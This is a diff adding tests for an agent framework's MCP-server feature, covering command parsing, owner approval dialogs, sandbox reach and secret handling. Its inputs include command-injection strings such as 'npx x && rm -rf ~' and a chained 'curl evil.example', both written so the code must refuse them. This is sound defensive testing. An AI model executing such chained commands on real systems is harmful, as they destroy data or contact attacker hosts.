@@ -5,7 +5,9 @@ import path from "node:path";
 import { test } from "node:test";
 import { promisify } from "node:util";
 import { loadConfig } from "../src/config.ts";
-import { addServer, listServers, piMcp, removeServer, serverStates } from "../src/mcp-config.ts";
+import os from "node:os";
+import { addServer, listServers, piMcp, removeServer, serverStates, splitCommand } from "../src/mcp-config.ts";
+import { sandboxAvailable } from "../src/security.ts";
 import { harness, mockMsg } from "./support/harness.ts";
 import { httpMcp } from "./support/http-mcp.ts";
 
@@ -265,4 +267,132 @@ test("the main agent creates an agent by tool call: the owner confirms, it exist
 	await h.restart();
 	assert.equal((h.pine.cfg.agents as any).research.description, "Looks things up and reports with sources");
 	await h.close();
+});
+
+/** A local MCP server in one file: `peek` reads a file, `home` says where its home is. Both show what the process may reach. */
+const LOCAL_SERVER = `import fs from "node:fs";
+import readline from "node:readline";
+const send = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
+readline.createInterface({ input: process.stdin }).on("line", (line) => {
+	let msg;
+	try { msg = JSON.parse(line); } catch { return; }
+	if (msg.id === undefined) return;
+	const reply = (result) => send({ jsonrpc: "2.0", id: msg.id, result });
+	if (msg.method === "initialize") return reply({ protocolVersion: msg.params?.protocolVersion ?? "2025-06-18", capabilities: { tools: {} }, serverInfo: { name: "local", version: "1" } });
+	if (msg.method === "ping") return reply({});
+	const tool = (name) => ({ name, description: name, inputSchema: { type: "object", properties: { path: { type: "string" } } }, annotations: { readOnlyHint: true } });
+	if (msg.method === "tools/list") return reply({ tools: [tool("peek"), tool("home")] });
+	if (msg.method === "tools/call") {
+		let text;
+		try { text = msg.params.name === "home" ? "HOME=" + process.env.HOME + " TOKEN=" + process.env.PINE_TEST_LOCAL_TOKEN : fs.readFileSync(msg.params.arguments.path, "utf8"); } catch (e) { text = "FAILED " + e.code; }
+		return reply({ content: [{ type: "text", text }] });
+	}
+	send({ jsonrpc: "2.0", id: msg.id, error: { code: -32601, message: "no such method" } });
+});
+`;
+
+test("a command line is a program and its arguments; what only a shell understands is refused", () => {
+	assert.deepEqual(splitCommand("npx -y @classcad/mcp@latest"), ["npx", "-y", "@classcad/mcp@latest"]);
+	assert.deepEqual(splitCommand(`  node  "my server.js" --name 'a b' --empty "" `), ["node", "my server.js", "--name", "a b", "--empty", ""]);
+	assert.deepEqual(splitCommand(""), []);
+	for (const line of ["npx x && rm -rf ~", "npx x | tee log", "npx x; id", "npx $(id)", "npx `id`", "npx x > out"]) assert.throws(() => splitCommand(line), /no shell runs this/, line);
+	assert.throws(() => splitCommand('node "open'), /not closed/);
+});
+
+test("an agent proposes a local server by its command; the owner confirms the command, and it runs in that agent's sandbox", { skip: !sandboxAvailable() }, async (t) => {
+	const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.homedir(), ".pine-test-elsewhere-")));
+	t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
+	fs.writeFileSync(path.join(dir, "notes.txt"), "ELSEWHERE-CONTENT\n");
+	process.env.PINE_TEST_LOCAL_TOKEN = "daemon-secret";
+	t.after(() => delete process.env.PINE_TEST_LOCAL_TOKEN);
+	const command = `${process.execPath} server.mjs`;
+	const files = { "server.mjs": LOCAL_SERVER, "mine.txt": "IN-THE-WORKSPACE\n" };
+
+	const h = await harness({ agents: { main: { files }, gonzo: {} } });
+	const asked: any[] = [];
+	let allow = false;
+	let values: Record<string, string> | undefined;
+	let incomplete = 0;
+	h.pine.bus.subscribe("approval/requested", (e) => {
+		asked.push(e.payload);
+		// A yes that lacks what the dialog asks the owner to type is not taken; the dialog stays open.
+		if (!h.pine.approvals.decide((e.payload as any).id, allow, "test", false, values)) {
+			incomplete++;
+			h.pine.approvals.decide((e.payload as any).id, false, "test");
+		}
+	});
+	const main = (steps: any[]) => h.pine.agents.run({ agent: "main", prompt: mockMsg(steps), ...owner });
+	const agentJson = () => JSON.parse(fs.readFileSync(path.join(h.home, "agents", "main", "agent.json"), "utf8"));
+
+	// What cannot be a server is refused before the owner is bothered.
+	await main([{ tools: [call("add_mcp_server", { name: "cad" }), call("add_mcp_server", { name: "cad", url: "https://x.example/mcp", command }), call("add_mcp_server", { name: "cad", command: `${command} && curl evil.example` })] }]);
+	assert.match(h.toolResults()[0], /either url .* or command/);
+	assert.match(h.toolResults()[1], /either url .* or command/);
+	assert.match(h.toolResults()[2], /no shell runs this/);
+	assert.equal(asked.length, 0);
+
+	// A no: nothing is written, and the agent can say how the owner would do it.
+	await main([{ tools: [call("add_mcp_server", { name: "cad", command, description: "builds parts" })] }]);
+	assert.ok(h.toolResults().at(-1)!.includes(`not added (test)`) && h.toolResults().at(-1)!.includes(`pine mcp add cad -- ${command}`), h.toolResults().at(-1)!);
+	assert.equal(agentJson().mcp, undefined);
+	assert.equal(asked.length, 1);
+	assert.ok(asked[0].summary.includes(`a program on this computer: ${command}`) && asked[0].summary.includes("runs in the sandbox of main") && asked[0].summary.includes("its workspace"), asked[0].summary);
+
+	// A yes: the entry says the program is to be held, and its tools are there with the next message.
+	allow = true;
+	await main([{ tools: [call("add_mcp_server", { name: "cad", command, description: "builds parts" })] }]);
+	assert.match(h.toolResults().at(-1)!, /Your owner confirmed it\. Added "cad".*its documentation names the command for it/);
+	assert.deepEqual(agentJson().mcp.cad, { command: process.execPath, args: ["server.mjs"], sandboxed: true, description: "builds parts", approve: "tainted" });
+	await main([{ tools: [call("mcp__cad__peek", { path: "mine.txt" }), call("mcp__cad__peek", { path: path.join(dir, "notes.txt") }), call("mcp__cad__peek", { path: path.join(h.home, "pine.json") }), call("mcp__cad__home", {})] }]);
+	const out = h.toolResults().slice(-4);
+	assert.deepEqual(mcpTools(h, h.mock.state.requests.at(-1)).sort(), ["mcp__cad__home", "mcp__cad__peek"]);
+	assert.ok(out[0].includes("IN-THE-WORKSPACE"), out[0]);
+	assert.match(out[1], /FAILED E(PERM|ACCES|NOENT)/, "the owner's files are as closed to it as to the agent's shell");
+	assert.match(out[2], /FAILED E(PERM|ACCES|NOENT)/, "and so is pine's own configuration");
+	assert.ok(out[3].includes(`HOME=${path.join(h.home, "sandbox", "main")}`) && out[3].includes("TOKEN=undefined"), `the agent's home, and nothing of the daemon's environment: ${out[3]}`);
+
+	// A key the server needs is typed by the owner into the dialog: the model names it and never sees it.
+	await main([{ tools: [call("add_mcp_server", { name: "keyed", url: "https://x.example/mcp", secrets: ["PINE_TEST_LOCAL_TOKEN"] }), call("add_mcp_server", { name: "keyed", command, secrets: ["sk-live 123"] })] }]);
+	assert.match(h.toolResults().at(-2)!, /secrets are for a local server/);
+	assert.match(h.toolResults().at(-1)!, /not the name of an environment variable.*never the key itself/);
+	// A yes without the key is not a yes.
+	await main([{ tools: [call("add_mcp_server", { name: "keyed", command, secrets: ["PINE_TEST_LOCAL_TOKEN"] })] }]);
+	assert.equal(agentJson().mcp.keyed, undefined);
+	assert.equal(incomplete, 1);
+	values = { PINE_TEST_LOCAL_TOKEN: "typed-by-the-owner" };
+	await main([{ tools: [call("add_mcp_server", { name: "keyed", command, secrets: ["PINE_TEST_LOCAL_TOKEN"] })] }]);
+	values = undefined;
+	assert.deepEqual(asked.at(-1).inputs, [{ name: "PINE_TEST_LOCAL_TOKEN", label: "PINE_TEST_LOCAL_TOKEN (the server reads it from its environment)", secret: true }]);
+	assert.ok(asked.at(-1).summary.includes("It needs PINE_TEST_LOCAL_TOKEN, which you type here"), asked.at(-1).summary);
+	assert.deepEqual(agentJson().mcp.keyed.env, { PINE_TEST_LOCAL_TOKEN: "${PINE_MCP_KEYED_MAIN_PINE_TEST_LOCAL_TOKEN}" }, "the entry has the name, not the key");
+	const envFile = () => fs.readFileSync(path.join(h.home, ".env"), "utf8");
+	assert.ok(envFile().includes("PINE_MCP_KEYED_MAIN_PINE_TEST_LOCAL_TOKEN=typed-by-the-owner"));
+	assert.ok(!JSON.stringify(h.mock.state.requests.map((r: any) => r.body)).includes("typed-by-the-owner"), "the model was never shown it");
+	await main([{ tools: [call("mcp__keyed__home", {})] }]);
+	assert.ok(h.toolResults().at(-1)!.includes("TOKEN=") && !h.toolResults().at(-1)!.includes("TOKEN=undefined") && !h.toolResults().at(-1)!.includes("daemon-secret"), `the server has the key: ${h.toolResults().at(-1)}`);
+	await main([{ tools: [call("remove_mcp_server", { name: "keyed" })] }]);
+	assert.ok(!envFile().includes("PINE_MCP_KEYED"), "and it goes with the server");
+
+	// Another agent cannot add one for everybody, and removing it leaves nothing behind.
+	await h.pine.agents.run({ agent: "gonzo", prompt: mockMsg([{ tools: [call("add_mcp_server", { name: "all", command, scope: "global" })] }]), ...owner });
+	assert.match(h.toolResults().at(-1)!, /Only the main agent/);
+	await main([{ tools: [call("remove_mcp_server", { name: "cad" })] }]);
+	assert.equal(agentJson().mcp, undefined);
+	await h.close();
+
+	// For an agent with the owner's account, the program reaches the account too, and still not pine's home.
+	const wide = await harness({ pine: { defaults: { scope: undefined } }, agents: { main: { files } } });
+	wide.pine.bus.subscribe("approval/requested", (e) => {
+		asked.push(e.payload);
+		wide.pine.approvals.decide((e.payload as any).id, true, "test");
+	});
+	const run = (steps: any[]) => wide.pine.agents.run({ agent: "main", prompt: mockMsg(steps), ...owner });
+	await run([{ tools: [call("add_mcp_server", { name: "cad", command })] }]);
+	assert.ok(asked.at(-1).summary.includes("your whole account"), asked.at(-1).summary);
+	await run([{ tools: [call("mcp__cad__peek", { path: path.join(dir, "notes.txt") }), call("mcp__cad__peek", { path: path.join(wide.home, "pine.json") }), call("mcp__cad__home", {})] }]);
+	const reach = wide.toolResults().slice(-3);
+	assert.ok(reach[0].includes("ELSEWHERE-CONTENT"), reach[0]);
+	assert.match(reach[1], /FAILED E(PERM|ACCES|NOENT)/);
+	assert.ok(reach[2].includes(`HOME=${os.homedir()}`) && reach[2].includes("TOKEN=undefined"), reach[2]);
+	await wide.close();
 });
